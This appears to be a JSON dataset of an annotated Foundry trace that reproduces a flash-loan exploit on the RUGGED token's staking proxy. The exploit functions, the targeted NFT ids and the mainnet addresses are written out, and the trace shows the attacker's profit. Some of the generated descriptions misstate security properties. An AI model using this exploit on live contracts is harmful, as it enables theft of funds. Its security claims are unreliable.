@@ -1,0 +1,436 @@
+[
+    {
+        "id": "23756",
+        "args": "",
+        "original_code": "    function testExploit() public {\n        payable(address(0)).transfer(WETH.balanceOf(address(this)));\n        deal(address(this), 0.000000000000000001 ether);\n        emit log_named_uint(\"Attacker Eth balance before attack:\", WETH.balanceOf(address(this)));\n        pool.flash(address(this), flashnumber, 0, abi.encode(0));\n        bool zeroForOne = true;\n        uint160 sqrtPriceLimitX96 = 4_295_128_740;\n        bytes memory data = abi.encodePacked(uint8(0x61));\n        int256 amountSpecified = int256(RUGGED.balanceOf(address(this)));\n        pool.swap(address(this), zeroForOne, amountSpecified, sqrtPriceLimitX96, data);\n        emit log_named_uint(\"Attacker Eth balance after attack:\", WETH.balanceOf(address(this)));\n    }\n\n",
+        "description": "1. **Core functions**:  \n   The `testExploit` function appears to simulate or execute an attack scenario involving a decentralized finance (DeFi) protocol. It performs several actions:  \n   - Sends all the Wrapped Ether (WETH) balance of the contract to the zero address (essentially burning it).  \n   - Adjusts the contract's Ether balance to a very small amount.  \n   - Triggers a flash loan from a pool, specifying a custom amount (`flashnumber`) and additional data.  \n   - Executes a swap operation in the pool, using the balance of a token (`RUGGED`) as the specified amount.  \n   The function logs the attacker's WETH balance before and after these operations, likely to track the impact of the attack.  \n\n2. **Security mechanism**:  \n   - **`payable`**: Ensures the function can handle Ether transfers.  \n   - **`transfer`**: Safely sends Ether to the zero address, preventing reentrancy attacks.  \n   - **`deal`**: Adjusts the contract's Ether balance, possibly to manipulate state for testing or exploitation.  \n   - **`flash` and `swap`**: These are likely part of a DeFi protocol's functions, which may include internal checks to prevent misuse, though this function appears to bypass or exploit them.  \n   - **`emit`**: Logs events to track the state before and after the attack, aiding in analysis or debugging.  \n\n3. **Parameter Function**:  \n   - **`flashnumber`**: Specifies the amount for the flash loan, determining how much liquidity is borrowed from the pool.  \n   - **`zeroForOne`**: A boolean flag indicating the direction of the swap (e.g., swapping token A for token B or vice versa).  \n   - **`sqrtPriceLimitX96`**: A price limit for the swap, ensuring the swap does not execute beyond a certain price point.  \n   - **`data`**: Additional encoded data passed to the swap function, possibly containing instructions or parameters for the operation.  \n\n4. **Return description**:  \n   The function does not return any value. Instead, it logs the attacker's WETH balance before and after the operations using `emit`. The calculation logic for these balances involves:  \n   - Before the attack: The WETH balance of the contract is logged.  \n   - After the attack: The WETH balance is logged again, showing the impact of the flash loan and swap operations.  \n\nIn summary, the `testExploit` function simulates an attack on a DeFi protocol by manipulating balances, executing a flash loan, and performing a swap. It logs the attacker's WETH balance before and after the attack to measure the outcome. The function uses parameters like `flashnumber` and `zeroForOne` to control the attack's behavior, while security mechanisms like `transfer` and `deal` ensure safe state manipulation.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "8882910",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": "",
+        "description": "",
+        "return_value": "0"
+    },
+    {
+        "id": "0",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "0",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "534",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0"
+    },
+    {
+        "id": "8216165",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19], 0, 0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": "    function flash(\n        address recipient,\n        uint256 amount0,\n        uint256 amount1,\n        bytes calldata data\n    ) external override lock noDelegateCall {\n        uint128 _liquidity = liquidity;\n        require(_liquidity > 0, 'L');\n\n        uint256 fee0 = FullMath.mulDivRoundingUp(amount0, fee, 1e6);\n        uint256 fee1 = FullMath.mulDivRoundingUp(amount1, fee, 1e6);\n        uint256 balance0Before = balance0();\n        uint256 balance1Before = balance1();\n\n        if (amount0 > 0) TransferHelper.safeTransfer(token0, recipient, amount0);\n        if (amount1 > 0) TransferHelper.safeTransfer(token1, recipient, amount1);\n\n        IUniswapV3FlashCallback(msg.sender).uniswapV3FlashCallback(fee0, fee1, data);\n\n        uint256 balance0After = balance0();\n        uint256 balance1After = balance1();\n\n        require(balance0Before.add(fee0) <= balance0After, 'F0');\n        require(balance1Before.add(fee1) <= balance1After, 'F1');\n\n        // sub is safe because we know balanceAfter is gt balanceBefore by at least fee\n        uint256 paid0 = balance0After - balance0Before;\n        uint256 paid1 = balance1After - balance1Before;\n\n        if (paid0 > 0) {\n            uint8 feeProtocol0 = slot0.feeProtocol % 16;\n            uint256 fees0 = feeProtocol0 == 0 ? 0 : paid0 / feeProtocol0;\n            if (uint128(fees0) > 0) protocolFees.token0 += uint128(fees0);\n            feeGrowthGlobal0X128 += FullMath.mulDiv(paid0 - fees0, FixedPoint128.Q128, _liquidity);\n        }\n        if (paid1 > 0) {\n            uint8 feeProtocol1 = slot0.feeProtocol >> 4;\n            uint256 fees1 = feeProtocol1 == 0 ? 0 : paid1 / feeProtocol1;\n            if (uint128(fees1) > 0) protocolFees.token1 += uint128(fees1);\n            feeGrowthGlobal1X128 += FullMath.mulDiv(paid1 - fees1, FixedPoint128.Q128, _liquidity);\n        }\n\n        emit Flash(msg.sender, recipient, amount0, amount1, paid0, paid1);\n    }\n\n    /// @inheritdoc IUniswapV3PoolOwnerActions\n",
+        "description": "1. Core functions:  \nThe `flash` function allows a user to borrow a certain amount of two tokens (`amount0` and `amount1`) from a liquidity pool, perform some operations with them, and then return the borrowed tokens along with a fee. This is commonly used in \"flash loans,\" where users can borrow tokens temporarily without collateral, as long as they return the tokens within the same transaction. The function also ensures that the borrowed tokens are returned with the correct fees and updates the pool's internal state accordingly.\n\n2. Security mechanism:  \n- **`lock` modifier**: Prevents reentrancy attacks by ensuring the function cannot be called again while it is still executing.  \n- **`noDelegateCall` modifier**: Ensures the function cannot be called via a delegate call, which could lead to unexpected behavior.  \n- **`require` statements**: These checks ensure that the liquidity pool has enough tokens (`_liquidity > 0`) and that the borrowed tokens are returned with the correct fees (`balance0Before.add(fee0) <= balance0After` and `balance1Before.add(fee1) <= balance1After`).  \n- **Fee calculations**: The function calculates and enforces fees to ensure the pool is compensated for the borrowed tokens.  \n\n3. Parameter Function:  \n- **`recipient`**: The address that will receive the borrowed tokens.  \n- **`amount0`**: The amount of the first token to borrow.  \n- **`amount1`**: The amount of the second token to borrow.  \n- **`data`**: Additional data that can be passed to the callback function, allowing the recipient to perform custom operations with the borrowed tokens.  \n\n4. Return description:  \nThe function does not return a value directly. Instead, it updates the pool's internal state by:  \n- Calculating and deducting fees (`fee0` and `fee1`) from the borrowed amounts.  \n- Updating the protocol fees (`protocolFees.token0` and `protocolFees.token1`) if applicable.  \n- Updating the global fee growth variables (`feeGrowthGlobal0X128` and `feeGrowthGlobal1X128`) to reflect the fees paid.  \n- Emitting an event (`Flash`) that logs the details of the flash loan, including the sender, recipient, borrowed amounts, and fees paid.  \n\nIn summary,  \nThe `flash` function enables temporary borrowing of tokens from a liquidity pool, ensuring that the tokens are returned with the correct fees. It includes security measures like reentrancy protection and fee enforcement, and it updates the pool's state to reflect the transaction. The function is designed to support flash loans, allowing users to perform complex operations within a single transaction.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2630",
+        "args": "pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]",
+        "original_code": null,
+        "description": null,
+        "return_value": "356565570739218611936 [3.565e20]"
+    },
+    {
+        "id": "2534",
+        "args": "pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]",
+        "original_code": null,
+        "description": null,
+        "return_value": "21357138155001948655 [2.135e19]"
+    },
+    {
+        "id": "2315335",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 22000000000000000000 [2.2e19]",
+        "original_code": "    function transfer(address to, uint256 amount) public returns (bool) {\n        return _transfer(msg.sender, to, amount);\n    }\n\n    /// @notice Function for native transfers with contract support\n",
+        "description": "1. Core functions:  \nThe `transfer` function is designed to move a specified amount of tokens from the sender's account to another account (`to`). It acts as a bridge, calling an internal `_transfer` function to perform the actual transfer operation.\n\n2. Security mechanism:  \nThe function uses the `public` modifier, meaning it can be called by anyone. However, it relies on the internal `_transfer` function to handle the actual transfer logic, which likely includes checks to ensure the sender has enough tokens and that the transfer is valid. The `msg.sender` parameter ensures that the transfer is initiated by the rightful owner of the tokens.\n\n3. Parameter Function:  \n- `to`: This is the address of the recipient who will receive the tokens.  \n- `amount`: This specifies the number of tokens to be transferred from the sender to the recipient.  \n\n4. Return description:  \nThe function returns a boolean value (`true` or `false`) indicating whether the transfer was successful. This value is determined by the internal `_transfer` function, which handles the actual transfer logic and checks for conditions like sufficient balance.\n\nIn summary, the `transfer` function facilitates the movement of tokens between accounts, ensuring the sender is authorized and the transfer is valid, while returning a success or failure status.",
+        "return_value": "true"
+    },
+    {
+        "id": "5869810",
+        "args": "66000000000000000 [6.6e16], 0, 0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": "    function uniswapV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {\n        proxy.claimReward();\n        uint256[] memory tokenId = new uint256[](20);\n        tokenId[0] = 9721;\n        tokenId[1] = 5163;\n        tokenId[2] = 2347;\n        tokenId[3] = 3145;\n        tokenId[4] = 2740;\n        tokenId[5] = 1878;\n        tokenId[6] = 6901;\n        tokenId[7] = 3061;\n        tokenId[8] = 1922;\n        tokenId[9] = 5301;\n        tokenId[10] = 454;\n        tokenId[11] = 2178;\n        tokenId[12] = 8298;\n        tokenId[13] = 4825;\n        tokenId[14] = 9307;\n        tokenId[15] = 2628;\n        tokenId[16] = 6115;\n        tokenId[17] = 8565;\n        tokenId[18] = 7991;\n        tokenId[19] = 4945;\n\n        bytes memory commands = new bytes(1);\n        commands[0] = 0x04;\n        bytes[] memory inputs = new bytes[](1);\n        inputs[0] = abi.encodePacked(abi.encode(address(0)), abi.encode(address(this)), abi.encode(1));\n        uint256 deadline = block.timestamp;\n        IRUGGEDPROXY.UniversalRouterExecute memory swapParam =\n            IRUGGEDPROXY.UniversalRouterExecute({commands: commands, inputs: inputs, deadline: deadline});\n\n        proxy.targetedPurchase{value: 0.000000000000000001 ether}(tokenId, swapParam);\n        proxy.unstake(RUGGED.balanceOf(address(this)));\n        RUGGED.transfer(address(pool), flashnumber + fee0);\n    }\n\n",
+        "description": "1. **Core functions:**  \n   This function is designed to handle a specific callback during a flash loan operation on Uniswap V3. It performs several tasks:  \n   - Claims a reward using a proxy contract.  \n   - Creates a list of token IDs (20 in total) that are likely used for some operation.  \n   - Prepares a set of commands and inputs for a swap operation.  \n   - Executes a targeted purchase using the proxy contract with a minimal amount of Ether.  \n   - Unstakes a certain amount of tokens (likely related to the `RUGGED` token).  \n   - Transfers a calculated amount of `RUGGED` tokens to a pool, including a fee from the flash loan.  \n\n2. **Security mechanism:**  \n   - The function is marked as `external`, meaning it can only be called from outside the contract.  \n   - It uses a minimal amount of Ether (`0.000000000000000001 ether`) for the targeted purchase, reducing the risk of significant financial loss.  \n   - The `deadline` parameter ensures the swap operation must be executed before a specific time, preventing stale transactions.  \n   - The function relies on a proxy contract to handle critical operations, which may include additional security checks.  \n\n3. **Parameter Function:**  \n   - `fee0` and `fee1`: These represent fees associated with the flash loan, likely for two different tokens.  \n   - `data`: This is additional information passed to the callback, though it is not used in this function.  \n   - The function does not directly use these parameters for calculations but includes `fee0` in the final token transfer to the pool.  \n\n4. **Return description:**  \n   The function does not return any value. Instead, it performs actions such as claiming rewards, executing a swap, unstaking tokens, and transferring tokens to a pool. The final transfer includes the `flashnumber` (a variable not defined in the code) and the `fee0` parameter, which is likely a fee from the flash loan.  \n\n**In summary,**  \nThis function is a callback for a flash loan operation on Uniswap V3. It handles reward claims, prepares and executes a swap, unstakes tokens, and transfers tokens to a pool. It includes minimal Ether usage and a deadline for the swap to enhance security. The function does not return any value but performs several critical operations related to the flash loan process.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "45483",
+        "args": "",
+        "original_code": "",
+        "description": "",
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "40593",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "3446361",
+        "args": "[9721, 5163, 2347, 3145, 2740, 1878, 6901, 3061, 1922, 5301, 454, 2178, 8298, 4825, 9307, 2628, 6115, 8565, 7991, 4945], UniversalRouterExecute({ commands: 0x04, inputs: [0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001], deadline: 1708351211 [1.708e9] }",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "3445774",
+        "args": "[9721, 5163, 2347, 3145, 2740, 1878, 6901, 3061, 1922, 5301, 454, 2178, 8298, 4825, 9307, 2628, 6115, 8565, 7991, 4945], UniversalRouterExecute({ commands: 0x04, inputs: [0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001], deadline: 1708351211 [1.708e9] }",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2630",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb]",
+        "original_code": null,
+        "description": null,
+        "return_value": "511846574232226400833 [5.118e20]"
+    },
+    {
+        "id": "2422527",
+        "args": "0x04, [0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e14960000000000000000000000000000000000000000000000000000000000000001], 1708351211 [1.708e9]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2408770",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "24681",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
+        "original_code": "    function approve(\n        address spender,\n        uint256 amountOrId\n    ) public returns (bool) {\n        if (amountOrId <= maxMintedId && amountOrId > 0) {\n            address owner = _ownerOf[amountOrId];\n\n            if (msg.sender != owner && !isApprovedForAll[owner][msg.sender]) {\n                revert Unauthorized();\n            }\n\n            getApproved[amountOrId] = spender;\n\n            emit Approval(owner, spender, amountOrId);\n        } else {\n            allowance[msg.sender][spender] = amountOrId;\n\n            emit Approval(msg.sender, spender, amountOrId);\n        }\n\n        return true;\n    }\n\n    /// @notice Function native approvals\n    function setApprovalForAll(address operator, bool approved) public {\n        isApprovedForAll[msg.sender][operator] = approved;\n\n        emit ApprovalForAll(msg.sender, operator, approved);\n    }\n\n    /// @notice Function for mixed transfers\n",
+        "description": "1. Core functions:\n   - The `approve` function allows a user to give permission to another address (`spender`) to spend a specific amount of tokens or manage a specific token ID on their behalf. This is commonly used in token contracts to delegate control over assets.\n   - The `setApprovalForAll` function allows a user to grant or revoke permission for an `operator` to manage all of their tokens. This is useful when a user wants to delegate control over their entire token collection to another address.\n\n2. Security mechanism:\n   - The `approve` function includes checks to ensure that only the owner of the token or someone who has been granted approval for all tokens (`isApprovedForAll`) can set the approval. If these conditions are not met, the function reverts with an `Unauthorized` error.\n   - The `setApprovalForAll` function does not have additional checks beyond ensuring the caller is the owner of the tokens, as it directly sets the approval status for the specified operator.\n\n3. Parameter Function:\n   - In the `approve` function:\n     - `spender`: The address that is being granted permission to spend the tokens or manage the token ID.\n     - `amountOrId`: The specific amount of tokens or the token ID being approved. If it is a token ID, it must be within a valid range (`maxMintedId`).\n   - In the `setApprovalForAll` function:\n     - `operator`: The address that is being granted or revoked permission to manage all tokens.\n     - `approved`: A boolean value indicating whether the operator is being granted (`true`) or revoked (`false`) permission.\n\n4. Return description:\n   - The `approve` function always returns `true` if the operation is successful. This indicates that the approval has been set as requested. If the conditions are not met, the function reverts instead of returning a value.\n   - The `setApprovalForAll` function does not return any value. It simply updates the approval status and emits an event to log the change.\n\nIn summary, these functions manage permissions for token transfers and management. The `approve` function allows specific approvals for individual tokens or amounts, while `setApprovalForAll` handles broader permissions for all tokens. Both functions include security checks to ensure only authorized users can set these permissions.",
+        "return_value": "true"
+    },
+    {
+        "id": "630",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "22000000000000000000 [2.2e19]"
+    },
+    {
+        "id": "2378807",
+        "args": "22000000000000000000 [2.2e19]",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2378417",
+        "args": "22000000000000000000 [2.2e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "2325542",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], 22000000000000000000 [2.2e19]",
+        "original_code": "    function transferFrom(\n        address sender,\n        address recipient,\n        uint256 amount\n    ) external returns (bool);\n\n    /// @notice Event emitted when tokens are transferred from one address to another, either via `#transfer` or `#transferFrom`.\n    /// @param from The account from which the tokens were sent, i.e. the balance decreased\n    /// @param to The account to which the tokens were sent, i.e. the balance increased\n    /// @param value The amount of tokens that were transferred\n    event Transfer(address indexed from, address indexed to, uint256 value);\n\n    /// @notice Event emitted when the approval amount for the spender of a given owner's tokens changes.\n    /// @param owner The account that approved spending of its tokens\n    /// @param spender The account for which the spending allowance was modified\n    /// @param value The new allowance from the owner to the spender\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n",
+        "description": "1. **Core functions:**\n   The `transferFrom` function is designed to move a specified amount of tokens from one account (`sender`) to another (`recipient`). This function is typically used when a third party (like a smart contract or another user) has been given permission to manage tokens on behalf of the `sender`. It ensures that tokens can be transferred without the `sender` needing to directly initiate the transaction.\n\n2. **Security mechanism:**\n   The function is marked as `external`, meaning it can only be called from outside the contract, ensuring it cannot be accessed internally. Additionally, the function relies on the `sender` having previously approved the caller to spend a certain amount of tokens on their behalf. This approval mechanism is enforced through an `allowance` system, which prevents unauthorized transfers. The `Transfer` and `Approval` events are emitted to log token movements and changes in spending permissions, providing transparency and traceability.\n\n3. **Parameter Function:**\n   - `sender`: The address of the account from which tokens are being transferred. This account must have previously approved the caller to spend its tokens.\n   - `recipient`: The address of the account that will receive the tokens.\n   - `amount`: The number of tokens to be transferred from the `sender` to the `recipient`.\n\n4. **Return description:**\n   The function returns a boolean value (`true` or `false`) to indicate whether the transfer was successful. If the transfer is completed without issues, it returns `true`. If there are any problems (e.g., insufficient balance or allowance), it returns `false`.\n\n**In summary,**\nThe `transferFrom` function facilitates the transfer of tokens from one account to another, provided the caller has been approved to do so. It includes security measures like external access restrictions and an allowance system, and it logs events for transparency. The function parameters specify the sender, recipient, and amount of tokens, and it returns a boolean to confirm the success of the transfer.",
+        "return_value": "Returned"
+    },
+    {
+        "id": "630",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb]",
+        "original_code": null,
+        "description": null,
+        "return_value": "533846574232226400833 [5.338e20]"
+    },
+    {
+        "id": "86122",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9721",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5163",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2347",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3145",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2740",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1878",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6901",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 3061",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1922",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5301",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 454",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2178",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8298",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4825",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9307",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2628",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6115",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8565",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 7991",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "46322",
+        "args": "proxy: [0x2648f5592c09a260C601ACde44e7f8f2944944Fb], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4945",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "630",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "20000000000000000000 [2e19]"
+    },
+    {
+        "id": "2233086",
+        "args": "20000000000000000000 [2e19]",
+        "original_code": "",
+        "description": "",
+        "return_value": "Returned"
+    },
+    {
+        "id": "2232696",
+        "args": "20000000000000000000 [2e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "4904",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 82421081864000000 [8.242e16]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "2215934",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 20000000000000000000 [2e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "116880",
+        "args": "pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5], 22066000000000000000 [2.206e19]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "630",
+        "args": "pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]",
+        "original_code": null,
+        "description": null,
+        "return_value": "356631570739218611936 [3.566e20]"
+    },
+    {
+        "id": "534",
+        "args": "pool: [0x99147452078fa5C6642D3E5F7efD51113A9527a5]",
+        "original_code": null,
+        "description": null,
+        "return_value": "21357138155001948655 [2.135e19]"
+    },
+    {
+        "id": "630",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "18016421081864000000 [1.801e19]"
+    },
+    {
+        "id": "633654",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], true, 18016421081864000000 [1.801e19], 4295128740 [4.295e9], 0x61",
+        "original_code": "    function swap(\n        address recipient,\n        bool zeroForOne,\n        int256 amountSpecified,\n        uint160 sqrtPriceLimitX96,\n        bytes calldata data\n    ) external override noDelegateCall returns (int256 amount0, int256 amount1) {\n        require(amountSpecified != 0, 'AS');\n\n        Slot0 memory slot0Start = slot0;\n\n        require(slot0Start.unlocked, 'LOK');\n        require(\n            zeroForOne\n                ? sqrtPriceLimitX96 < slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 > TickMath.MIN_SQRT_RATIO\n                : sqrtPriceLimitX96 > slot0Start.sqrtPriceX96 && sqrtPriceLimitX96 < TickMath.MAX_SQRT_RATIO,\n            'SPL'\n        );\n\n        slot0.unlocked = false;\n\n        SwapCache memory cache =\n            SwapCache({\n                liquidityStart: liquidity,\n                blockTimestamp: _blockTimestamp(),\n                feeProtocol: zeroForOne ? (slot0Start.feeProtocol % 16) : (slot0Start.feeProtocol >> 4),\n                secondsPerLiquidityCumulativeX128: 0,\n                tickCumulative: 0,\n                computedLatestObservation: false\n            });\n\n        bool exactInput = amountSpecified > 0;\n\n        SwapState memory state =\n            SwapState({\n                amountSpecifiedRemaining: amountSpecified,\n                amountCalculated: 0,\n                sqrtPriceX96: slot0Start.sqrtPriceX96,\n                tick: slot0Start.tick,\n                feeGrowthGlobalX128: zeroForOne ? feeGrowthGlobal0X128 : feeGrowthGlobal1X128,\n                protocolFee: 0,\n                liquidity: cache.liquidityStart\n            });\n\n        // continue swapping as long as we haven't used the entire input/output and haven't reached the price limit\n        while (state.amountSpecifiedRemaining != 0 && state.sqrtPriceX96 != sqrtPriceLimitX96) {\n            StepComputations memory step;\n\n            step.sqrtPriceStartX96 = state.sqrtPriceX96;\n\n            (step.tickNext, step.initialized) = tickBitmap.nextInitializedTickWithinOneWord(\n                state.tick,\n                tickSpacing,\n                zeroForOne\n            );\n\n            // ensure that we do not overshoot the min/max tick, as the tick bitmap is not aware of these bounds\n            if (step.tickNext < TickMath.MIN_TICK) {\n                step.tickNext = TickMath.MIN_TICK;\n            } else if (step.tickNext > TickMath.MAX_TICK) {\n                step.tickNext = TickMath.MAX_TICK;\n            }\n\n            // get the price for the next tick\n            step.sqrtPriceNextX96 = TickMath.getSqrtRatioAtTick(step.tickNext);\n\n            // compute values to swap to the target tick, price limit, or point where input/output amount is exhausted\n            (state.sqrtPriceX96, step.amountIn, step.amountOut, step.feeAmount) = SwapMath.computeSwapStep(\n                state.sqrtPriceX96,\n                (zeroForOne ? step.sqrtPriceNextX96 < sqrtPriceLimitX96 : step.sqrtPriceNextX96 > sqrtPriceLimitX96)\n                    ? sqrtPriceLimitX96\n                    : step.sqrtPriceNextX96,\n                state.liquidity,\n                state.amountSpecifiedRemaining,\n                fee\n            );\n\n            if (exactInput) {\n                state.amountSpecifiedRemaining -= (step.amountIn + step.feeAmount).toInt256();\n                